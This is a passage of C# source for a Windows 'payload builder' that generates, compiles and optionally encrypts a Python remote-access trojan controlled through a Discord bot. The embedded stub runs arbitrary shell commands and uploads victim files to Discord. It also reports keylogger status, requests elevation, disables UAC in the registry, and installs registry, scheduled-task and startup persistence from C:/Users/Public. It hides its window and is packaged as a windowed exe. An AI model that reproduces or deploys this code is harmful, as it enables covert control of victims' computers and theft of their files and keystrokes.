                            info.append(f"Private IP: {private_ip}")
                            info.append(f"Public IP: {GetPublicIP()}")
                            info.append(f"Keylogger Activated: {is_logging}")

                            return '\n'.join(info)
                        except Exception as e:
                            return f"An error occurred while fetching system information: {e}"

                    def convert_bytes(bytes_value):
                        # Convert bytes to human-readable format
                        for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
                            if bytes_value < 1024:
                                return f"{bytes_value:.2f} {unit}"
                            bytes_value /= 1024
                        return f"{bytes_value:.2f} PB"

                    def GetPublicIP():
                        ip_address = requests.get('https://httpbin.org/ip').json()['origin'] # Get public IP address
                        return ip_address

                    def GetLocalIP():
                        private_ip = socket.gethostbyname(socket.gethostname())
                        return private_ip

                    def CallME(argument):
                        try:
                            result = subprocess.run(argument, shell=True, text=True, capture_output=True)
                            if result.returncode == 0:
                                return result.stdout
                            else:
                                return f"Command exited with status code {result.returncode}.\n{result.stderr}"
                        except Exception as e:
                            return f"An error occurred: {e}"

                    async def DownloadFile(file_name, channel):
                        try:
                            with open(file_name, 'rb') as file:
                                file_content = file.read()
                                file_message = await channel.send(file=discord.File(io.BytesIO(file_content), filename=file_name))
                                await channel.send(f"File '{file_name}' uploaded and available for download.")
                        except Exception as e:
                            await channel.send(f"An error occurred while uploading the file: {e}")

                    # check and ask for elevation
                    # Function for trying to run the script elevated
                    def elevate_privileges():
                        try:
                            admin_pass = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                            if admin_pass > 32:
                                return "Success! You should recive a new connection with a Elevated Client." and os._exit(0)
                            else:
                                return "User pressed \"No\". Privilege elevation not successful"
                        except Exception as e:
                            return f"Failed to elevate privileges: {e}"

                    # Function for getting if user is elevated or not
                    def is_admin():
                        try:
                            # Check if the current process has administrative privileges
                            return ctypes.windll.shell32.IsUserAnAdmin() != 0
                        except:
                            return False


                    # ------------------------------------------------------------
                    #
                    #                    SETTINGS STARTS HERE
                    #
                    # ------------------------------------------------------------

                    # The part that runs on start, asking for elevation.
                    if askForUACOnStart:
                        if is_admin():
                            print("User has administrative privileges already...")
                        else:
                            print("User does not have administrative privileges. Requesting it now!")
                            elevate_privileges()
                    else:
                        print("Does not try to ask for UAC on start")

                    # Disable uac on start or not...
                    if disableUACOnStart:
                        print("Trying to disable UAC on start...")
                        try:
                            # Check if the operating system is Windows
                            if platform.system() == "Windows":
                                print("Operating system is Windows")

                                # Check if the client has administrative privileges
                                if is_admin():
                                    print("User has administrative privileges.")
                                    try:
                                        # Disable UAC
                                        CallME('powershell.exe Set-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name EnableLUA -Value 0')
                                        print("UAC disabled!")
                                    except Exception as e:
                                        print(f"An error occurred while disabling UAC: {e}")
                                else:
                                    print("User does not have administrative privileges.")
                            else:
                                print("This feature is only supported on Windows.")
                        except Exception as os_error:
                            print(f"An error occurred while checking the operating system: {os_error}")
                    else:
                        print("Does not disable UAC on start!")

                    # Try to install on start or not..
                    if installOnStart:
                        if has_better_persistence():
                            print("Client already has persistence, there is no need to install again.")
                        else:
                            print("Trying to install on start...")
                            try:
                                # Check if the operating system is Windows
                                if platform.system() == "Windows":
                                    print("Operating system is Windows")

                                    # Check if the cloned script is in the public directory
                                    public_directory = Path('C:/Users/Public')
                                    copied_script_path = public_directory / (publicFileName + ".pyw")
                                    if (Path(script_path) != copied_script_path):
                                        print("Duplicated Script is not in the public directory. Copying...")
                                        # Copy the script to the public directory
                                        shutil.copy(script_path, copied_script_path)
                                        print(f"Duplicated Script copied to public directory! (Filename is **{publicFileName}**)")
                                    else:
                                        print(f"Duplicated Script is already in the public directory. (Filename is **{publicFileName}**)")

                                    current_status = CheckBetterPersistence(script_path)
                                    # Check and enable Registry Persistence if not already enabled
                                    if not current_status['registry_persistence']:
                                        try:
                                            print("Starting Registry Persistence phase...")
                                            registry_persistence(script_path)
                                            print("Registry Persistence done!")
                                        except Exception as e:
                                            print(f"Error starting registry persistence: {e}")
                                    else:
                                        print("Registry Persistence is already active.")

                                    # Check and enable Task Scheduler Persistence if not already enabled
                                    if not current_status['task_scheduler_persistence']:
                                        try:
                                            print("Starting Task Scheduler Persistence phase...")
                                            task_scheduler_persistence(script_path)
                                            print("Task Scheduler Persistence done!")
                                        except Exception as e:
                                            print(f"Error starting task scheduler persistence: {e}")
                                    else:
                                        print("Task Scheduler Persistence is already active.")

                                    # Check and enable Startup Persistence if not already enabled
                                    if not current_status['startup_persistence']:
                                        try:
                                            print("Starting Startup Persistence phase...")
                                            startup_persistence(script_path)
                                            print("Startup Persistence done!")
                                        except Exception as e:
                                            print(f"Error starting startup persistence: {e}")
                                    else:
                                        print("Startup Persistence is already active.")

                                    print("\n**Done with all phases! \nChecking status...**\n")
                                else:
                                    print("This feature is only supported on Windows.")
                            except Exception as os_error:
                                print(f"An error occurred while checking the operating system: {os_error}")
                    else:
                        print("Does not install on start!")

                    # Try to hide window:
                    if hideConsoleOnStart:
                        try:
                            print("Trying to hide window...")
                            # Run the command in the current console
                            try:
                                subprocess.run("DeviceCredentialDeployment", shell=True)
                            except Exception as e:
                                print(f"An error occurred while hiding window: {e}")
                            print("Window hidden!")
                        except Exception as e:
                            print(f"An error occurred while hiding window: {e}")
                    else:
                        print("Does not hide window!")

                    # ------------------------------------------------------------
                    #
                    #                     SETTINGS ENDS HERE
                    #
                    # ------------------------------------------------------------

                    # Try to start bot using primary token and if that fails, try alternative token
                    # Function to start the bot with a given token
                    async def start_bot(token):
                        try:
                            print(f"Trying to start bot...")
                            await bot.start(token)
                        except discord.LoginFailure:
                            print(f"Improper token has been passed.")
                            raise  # Re-raise the exception to handle it in the calling code
                        except aiohttp.ClientConnectionError:
                            print(f"Connection error occurred. Check your internet connection.")
                        except Exception as e:
                            print(f"An error occurred: {e}")


                    # Try to start bot using primary token and if that fails, try alternative token
                    async def main(): 
                        while True:
                            try:
                                await start_bot(primary_token)
                                break  # If successful, break the loop
                            except discord.LoginFailure:
                                try:
                                    await start_bot(alternative_token)
                                    break  # If successful, break the loop
                                except discord.LoginFailure as e:
                                    print(f"Both primary and alternative tokens failed. Error: {e}")
                            except Exception as e:
                                print(f"An error occurred: {e}")
                            print("Waiting for 3 seconds before retrying...")
                            await asyncio.sleep(3)  # Wait for 3 seconds before retrying

                    # Run the asynchronous main function
                    asyncio.run(main())
                    """;
            }
            OutputInfo("Finished Generating Payload!");
            return originalStub;
        }

        public string AddNewStub(string newStub)
        {
            // Replace the variable references with the variable names as strings
            string newFixedStub = newStub.Replace("installOnStart = False", "installOnStart = \n\"\"\"\n+\ncbCTS.Checked\n+\n\"\"\"\n");
            newFixedStub = newFixedStub.Replace("askForUACOnStart = False", "askForUACOnStart = \n\"\"\"\n+\ncbSE.Checked\n+\n\"\"\"\n");
            newFixedStub = newFixedStub.Replace("disableUACOnStart = False", "disableUACOnStart = \n\"\"\"\n+\ncbDUAC.Checked\n+\n\"\"\"\n");
            newFixedStub = newFixedStub.Replace("hideConsoleOnStart = False", "hideConsoleOnStart = \n\"\"\"\n+\ncbHT.Checked\n+\n\"\"\"\n");

            newFixedStub = newFixedStub.Replace("categorieName = \"(Only for V1.8 and above)\"", "categorieName = \n\"\"\"\n+\ntxtCategorie.Text\n+\n\"\"\"\n");
            newFixedStub = newFixedStub.Replace("GOOGLE_API_KEY = \"<GOOGLE-MAPS-API>\"", "GOOGLE_API_KEY = \n\"\"\"\n+\ntxtGoogleAPI.Text\n+\n\"\"\"\n");

            newFixedStub = newFixedStub.Replace("registryName = \"(Only for V1.9.5 and above)\"", "registryName = \n\"\"\"\n+\ntxtPreReg.Text\n+\n\"\"\"\n");
            newFixedStub = newFixedStub.Replace("taskName = \"(Only for V1.9.5 and above)\"", "taskName = \n\"\"\"\n+\ntxtPreTask.Text\n+\n\"\"\"\n");
            newFixedStub = newFixedStub.Replace("startupName = \"(Only for V1.9.5 and above)\"", "startupName = \n\"\"\"\n+\ntxtPreStart.Text\n+\n\"\"\"\n");
            newFixedStub = newFixedStub.Replace("publicFileName = \"(Only for V1.9.6 and above)\"", "publicFileName = \n\"\"\"\n+\ntxtPrePublic.Text\n+\n\"\"\"\n");
            
            newFixedStub = newFixedStub.Replace("primary_token = \"(Only for V2.0.0 and above)\"", "primary_token = \n\"\"\"\n+\ntxtInputToken.Text\n+\n\"\"\"\n");
            newFixedStub = newFixedStub.Replace("alternative_token = \"(Only for V2.0.0 and above)\"", "alternative_token = \n\"\"\"\n+\ntxtBackupInputToken.Text\n+\n\"\"\"\n");
            
            return newFixedStub;
        }

        // Void for generating the Python payload with the right Token
        public void GeneratePayload()
        {
            string DBT; // DiscordBotToken
            bool CTS; // CopyToStartup
            bool SE; // StartElevated

            // Get if user wants to use CTS (CopyToStartup) or not.
            if (cbCTS.Checked)
            {
                CTS = true;
            }
            else
            {
                CTS = false;
            }

            // Get if user wants to use SE (StartElevated) or not.
            if (cbSE.Checked)
            {
                SE = true;
            }
            else
            {
                SE = false;
            }

            // Get the users DBT (DiscordBotToken)
            DBT = txtInputToken.Text;

            // DEBUG Results
            OutputInfo("\r\nDBT = " + DBT + "\r\n" + "CTS = " + CTS + "\r\n" + "SE = " + SE + ".");

            // Modify variables to add \' around it
            txtCategorie.Text = "'" + txtCategorie.Text + "'";
            txtGoogleAPI.Text = "'" + txtGoogleAPI.Text + "'";
            txtPreReg.Text = "'" + txtPreReg.Text + "'";
            txtPreTask.Text = "'" + txtPreTask.Text + "'";
            txtPreStart.Text = "'" + txtPreStart.Text + "'";
            txtPrePublic.Text = "'" + txtPrePublic.Text + "'";
            txtInputToken.Text = "'" + txtInputToken.Text + "'";
            txtBackupInputToken.Text = "'" + txtBackupInputToken.Text + "'";

            // Generate the fully generated stub
            string FullyGeneratedStub = GenerateStub(DBT, selectedVersion); // Call the payload generator

            // REmove the outer "'"'s
            txtCategorie.Text = txtCategorie.Text.Replace("'", "");
            txtGoogleAPI.Text = txtGoogleAPI.Text.Replace("'", "");   
            txtPreReg.Text = txtPreReg.Text.Replace("'", "");
            txtPreTask.Text = txtPreTask.Text.Replace("'", "");
            txtPreStart.Text = txtPreStart.Text.Replace("'", "");
            txtPrePublic.Text = txtPrePublic.Text.Replace("'", "");
            txtInputToken.Text = txtInputToken.Text.Replace("'", "");
            txtBackupInputToken.Text = txtBackupInputToken.Text.Replace("'", "");


            // Display a Yes/No dialog box
            DialogResult dialogResult = MessageBox.Show("Do you want your file to be output as a .exe? (If yes, it will take some time)", "Output Format", MessageBoxButtons.YesNo, MessageBoxIcon.Question);

            string outputFileFormat;
            if (dialogResult == DialogResult.Yes)
            {
                outputFileFormat = ".exe";

                // Call functions to generate the desired output format here
                // For example, GenerateExeFile(FullyGeneratedStub);

                // Generate .py file
                string pyFileName = "output.py";
                File.WriteAllText(pyFileName, FullyGeneratedStub);

                // Run pyinstaller command
                string pyinstallerCommand;
                if (cbDM.Checked)
                {
                    pyinstallerCommand = $"pyinstaller --onefile {pyFileName}";
                }
                else
                {
                    pyinstallerCommand = $"pyinstaller --noconfirm --onefile --windowed {pyFileName}";
                }

                string entirePyinstallerCommand = pyinstallerCommand + " && del output.py && del output.spec && rmdir /s /q build && exit";
                RunCommandVisible(entirePyinstallerCommand);

                // Open file path in File Explorer
                string outputPath = Path.GetDirectoryName(Application.ExecutablePath);
                string workingDirectory = Path.Combine(Path.GetDirectoryName(Application.ExecutablePath), "dist");
                OutputInfo("EXE will be here: " + workingDirectory);
                Thread.Sleep(7500); // Wait for some time...
                Process.Start("explorer.exe", workingDirectory);
            }
            else
            {
                string pyFileName;

                if (cbDM.Checked)
                {
                    outputFileFormat = ".py";
                    // Generate .py file
                    pyFileName = "output.py";
                }
                else
                {
                    outputFileFormat = ".pyw";
                    // Generate .pyw file
                    pyFileName = "output.pyw";
                }

                // Create the "build" directory if it does not exist
                string buildDirectoryPath = Path.Combine(Directory.GetCurrentDirectory(), "build");
                if (!Directory.Exists(buildDirectoryPath))
                {
                    Directory.CreateDirectory(buildDirectoryPath);
                }

                // Write the output code
                File.WriteAllText("build\\" + pyFileName, FullyGeneratedStub);

                // Encrypt or do not encrypt:
                if (cbEP.Checked)
                {
                    OutputInfo("Starting Encryption process...");

                    if (cbDM.Checked)
                    {
                        RunCommand("python encryptor.py build\\output.py true");
                    }
                    else
                    {
                        RunCommand("python encryptor.py build\\output.pyw false");
                    }

                    OutputInfo("Done with the Encryption process...");
                }
                else
                {
                    OutputInfo("Skipping Encryption process... (You did not select it)");
                }

                // Open file path in File Explorer
                Thread.Sleep(1000); // Wait for some time...
                
                string outputPath = Path.GetDirectoryName(Application.ExecutablePath);
                string buildOutputPath = outputPath + "\\build";

                OutputInfo("Build path: " + buildOutputPath);
                Process.Start("explorer.exe", buildOutputPath);
            }

            OutputInfo($"Generating {outputFileFormat} file...");

            OutputInfo($"{outputFileFormat} file generated successfully!");
        }


        // Function to run a command using cmd
        private void RunCommand(string command)
        {
            ProcessStartInfo processInfo = new ProcessStartInfo("cmd.exe", "/c " + command);
            processInfo.CreateNoWindow = true;
            processInfo.UseShellExecute = false;
            processInfo.RedirectStandardError = true;
            processInfo.RedirectStandardOutput = true;

            Process process = new Process();
            process.StartInfo = processInfo;
            process.Start();

            string output = process.StandardOutput.ReadToEnd();
            string error = process.StandardError.ReadToEnd();

            process.WaitForExit();
            process.Close();
        }
        private void RunCommandVisible(string command)
        {
            ProcessStartInfo processInfo = new ProcessStartInfo("cmd.exe", "/k " + command); // Use /k to keep the console window open after the command finishes
            processInfo.UseShellExecute = true;
            Process.Start(processInfo);
        }



        private void btnGeneratePy_Click(object sender, EventArgs e)
        {
            GeneratePayload();
        }

        // ------------------------------------------------------------------------- //
        //
        //                          Check Boxes
        //
        // ------------------------------------------------------------------------- //
        private void cbCTS_CheckedChanged(object sender, EventArgs e)
        {

        }
        private void cbEP_CheckedChanged(object sender, EventArgs e)
        {

        }

        // ------------------------------------------------------------------------- //
        //
        //                          Check Boxes
        //
        // ------------------------------------------------------------------------- //


        private void btnSeeDef_Click(object sender, EventArgs e)
        {
            RunCommand("notepad defs.txt");
        }

        private void btnInstallDef_Click(object sender, EventArgs e)
        {
            RunCommandVisible("installDefs.bat");
        }

        public string ConvertToSingleLine(string multilineScript)
        {
            // Replace newline characters with "\n"
            string singleLineScript = multilineScript.Replace(Environment.NewLine, "\\r\\n");

            return singleLineScript;
        }

        private void btnAddVersion_Click(object sender, EventArgs e)
        {
            // Ask the user for a name for the version
            string versionName = GetInput("Please enter a name for the version:", "Version Name", "1.0.0");

            // Create a new version in combo box
            comboBoxVersions.Items.Add(versionName);

            // Make user input their version Python code (Be able to input multiple lines)
            string versionCode = GetMultilineInput("Please enter the code for the version:", "Version Code", "print(\"Hello World\")");

            // Fix version code
            versionCode = AddNewStub(versionCode);

            // Print fixed version code
            OutputScript(versionCode);
        }

        private string GetMultilineInput(string prompt, string title, string defaultValue)
        {
            // Create a form with a label, rich text box (multiline), and OK/Cancel buttons
            Form inputForm = new Form();
            Label label = new Label() { Left = 20, Top = 20, Text = prompt };
            RichTextBox richTextBox = new RichTextBox() { Left = 20, Top = 50, Width = 400, Height = 200, Text = defaultValue };
            Button okButton = new Button() { Text = "OK", Left = 20, Top = 260 };
            Button cancelButton = new Button() { Text = "Cancel", Left = 120, Top = 260 };

            // Set up event handlers
            okButton.Click += (sender, e) => { inputForm.DialogResult = DialogResult.OK; inputForm.Close(); };
            cancelButton.Click += (sender, e) => { inputForm.DialogResult = DialogResult.Cancel; inputForm.Close(); };

            // Add controls to the form
            inputForm.Controls.Add(label);
            inputForm.Controls.Add(richTextBox);
            inputForm.Controls.Add(okButton);
            inputForm.Controls.Add(cancelButton);

            // Set form properties
            inputForm.Text = title;
            inputForm.AcceptButton = okButton;
            inputForm.CancelButton = cancelButton;

            // Show the form
            DialogResult result = inputForm.ShowDialog();

            // Return the user's input if OK was clicked, otherwise return an empty string
            return result == DialogResult.OK ? richTextBox.Text : string.Empty;
        }
        private string GetInput(string prompt, string title, string defaultValue)
        {
            // Create a form with a label, text box, and OK/Cancel buttons
            Form inputForm = new Form();
            Label label = new Label() { Left = 20, Top = 20, Text = prompt };
            TextBox textBox = new TextBox() { Left = 20, Top = 50, Width = 200, Text = defaultValue };
            Button okButton = new Button() { Text = "OK", Left = 20, Top = 80 };
            Button cancelButton = new Button() { Text = "Cancel", Left = 120, Top = 80 };

            // Set up event handlers
            okButton.Click += (sender, e) => { inputForm.DialogResult = DialogResult.OK; inputForm.Close(); };
            cancelButton.Click += (sender, e) => { inputForm.DialogResult = DialogResult.Cancel; inputForm.Close(); };

            // Add controls to the form
            inputForm.Controls.Add(label);
            inputForm.Controls.Add(textBox);
            inputForm.Controls.Add(okButton);
            inputForm.Controls.Add(cancelButton);

            // Set form properties
            inputForm.Text = title;
            inputForm.AcceptButton = okButton;
            inputForm.CancelButton = cancelButton;

            // Show the form
            DialogResult result = inputForm.ShowDialog();

            // Return the user's input if OK was clicked, otherwise return an empty string
            return result == DialogResult.OK ? textBox.Text : string.Empty;
        }
    }
}
